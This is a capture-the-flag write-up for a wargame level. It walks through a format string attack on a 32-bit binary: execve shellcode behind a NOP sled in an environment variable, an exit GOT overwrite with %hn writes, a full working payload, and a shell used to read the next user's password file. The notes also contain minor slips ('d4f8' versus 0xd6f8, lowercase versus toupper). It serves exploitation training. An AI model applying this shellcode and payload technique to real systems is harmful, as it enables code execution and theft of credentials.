# Level 05

## Initial Context

- One file: `level05`

## Gathering informations

The program read `stdin`, lowers the input and write it `stdout`.

By looking at the decompiled code, the process sends the buffer to `printf`, allowing a format string attack.
Right after the `printf` call, `exit` is called and can be overwritten using the `Global Offsets Table`.

### Finding the buffer location

First we need to know where the buffer is stored relative to the `printf` call:

```bash
$ for i in $(seq 1 42); do
>     echo -n "$i ";
>     python -c 'print "AAAA %'$i'$x''"' | ./level05;
> done | grep 61616161
10 aaaa 61616161
```

We can access the buffer at the `10`th parameter.

### Storing the payload

Then, since we cannot send the payload to `stdin` (because of the `toupper()`), we need to store it to the environment variables.
Storing it here is unstable since environment variables can move in memory.

To mitigate that, we can use a [NOP slide](https://en.wikipedia.org/wiki/NOP_slide) to give us more room.

```bash
export SHELLCODE=`python -c 'print "\x90" * 1024 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
```

Now we need to find the address of the `SHELLCODE` environment variable when a program is running.
For that, we can write a small utility ([full code](./Ressources/getenv.c)):

```c
void main(int argc, char const* argv[])
{
    char const *ptr = getenv(argv[1]);
    printf("address: %p\n", ptr);
}
```

```bash
$ gcc getenv.c -o getenv -m32
$ ./getenv SHELLCODE
address: 0xffffd4f8
```

To avoid small shifts in memory, let's add `512 bytes` (half of the NOP slide).
The address is now: `0xffffd6f8`

We cannot write `4294956792 bytes` directly via `printf` as it exceed `INT_MAX`.
But we can send both `0xffff` and `0xd6f8` as two shorts.

### Locate `exit`'s GOT

And last, we need to find `exit`'s GOT location:

```
$ gdb ./level05 
(gdb) disass 'exit@plt'
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
...
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
```

`exit`'s GOT is located at `0x080497e0`.

Since we need to write two shorts, the addresses will be:
- `0x080497e0` (or `e0 97 04 08` in LE)
- and `0x080497e2` (or `e2 97 04 08` in LE)

## Solving the Challenge

As previously stated, we need to overwrite `exit` GOT using two shorts.

Since when using `printf`'s `%n` specifier, the value does not reset, we need to take into account that.

The first value we need to write `n bytes` being `d4f8` minus `8 bytes` for the two addresses.

```python
# value itself
0xd6f8 = 55032

# skip two first addresses
55032 - 8 = 55024
```

For the second value, we need to write `n bytes` being the distance between two the shorts.

```python
# value itself
0xffff = 65535

# substract the first value
65535 - 55032 = 10503
```

We can now build the payload:

```python
# exit@got.plt, this will write 4 characters
"\xe0\x97\x04\x08"

# exit@got.plt + 2, this will write 4 characters
+ "\xe2\x97\x04\x08"

# write 55024 dummy characters for a total of 55032
+ "%55024x"

# ask print to store the number of characters written to the 10th parameters, using a short (h)
+ "%10$hn"

# write 10503 dummy characters, for a total of 65535
+ "%10503x"

# ask print to store the number of characters written to the 11th parameters, using a short (h)
+ "%11$hn"
```

We can store it and send it to the vulnerable program:

```bash
$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55024x%10$hn" + "%10503x%11$hn"' > /tmp/exploit05
$ cat /tmp/exploit05 - | ./level05
...
whoami
level06
cat /home/users/level06/.pass
<flag>
```

## References

- https://shankaraman.wordpress.com/category/ctf/binary-exploitation/
- https://www.ibm.com/docs/en/i/7.2?topic=functions-printf-print-formatted-characters
